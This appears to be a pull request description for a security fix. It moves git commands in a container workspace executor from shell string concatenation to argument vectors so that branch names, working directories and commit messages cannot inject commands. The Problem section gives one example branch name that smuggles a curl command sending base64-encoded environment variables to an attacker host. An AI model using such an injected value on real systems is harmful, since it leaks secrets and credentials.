# fix(dag-executor): switch to arg vectors for user-supplied values in container git commands

## Problem

`bootstrap-workspace!` in `oci_cli.clj` and `git-persist!`/`git-restore!` in
`workspace.clj` built git shell commands via raw string concatenation and passed
them to `exec-in-container`/`exec-in-pod` as `["sh" "-c" <string>]`. Neither
`branch`, `workdir`, nor `message` was validated or escaped before being
interpolated into the shell string.

A PR branch named `main; curl https://attacker.com/?q=$(env|base64)` would
execute the injected command inside the capsule.

## Fix

Switch every user-supplied value in git command construction from string
concatenation to **arg vectors**. Both `exec-in-container` (oci_cli) and
`exec-in-pod` (kubernetes) already handle vector commands by passing them
directly to `exec` without a shell, so no intermediate shell is involved at all.

Changed files:

| File | Change |
|------|--------|
| `components/dag-executor/src/…/runtime/oci_cli.clj` | `bootstrap-workspace!` — clone, config, set-url, rev-parse commands → vectors |
| `components/dag-executor/src/…/workspace.clj` | `git-persist!`, `git-restore!` — commit, push, fetch, checkout → vectors; docstrings updated |
| `components/dag-executor/test/…/workspace_test.clj` | `recording-exec-fn` normalizes vectors to strings for matching; commit-message assertions updated (no shell quoting) |

## Testing

- Unit tests in `workspace_test.clj` updated and pass against the new vector
  API (normalized via `cmd->str` helper in the test fixture).
- `oci_cli_test.clj` has no direct tests for `bootstrap-workspace!`; no changes
  needed there.
- `exec-in-container` and `exec-in-pod` both branch on `(string? command)`:
  vectors take the direct exec path, bypassing sh entirely.
